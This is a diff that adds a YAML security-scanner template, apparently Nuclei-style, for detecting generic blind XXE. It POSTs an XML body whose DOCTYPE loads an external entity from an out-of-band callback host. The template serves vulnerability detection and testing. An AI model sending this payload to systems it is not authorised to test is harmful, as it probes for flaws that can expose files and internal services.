@@ -1,0 +1,24 @@
+id: generic-blind-xxe
+info:
+  name: Generic Blind XXE
+  author: geeknik
+  description: This template detects Generic Blind XXE.
+  severity: high
+  metadata:
+    max-request: 1
+  tags: xxe,generic,blind
+traps:
+- request:
+    method: POST
+    path: /
+    headers:
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      Referer: '{{BaseURL}}'
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE foo SYSTEM "http://{{interactsh-url}}">
+      <foo>&e1;</foo>
+  response:
+    status_code: 200
+    headers: {}
+    body: ''
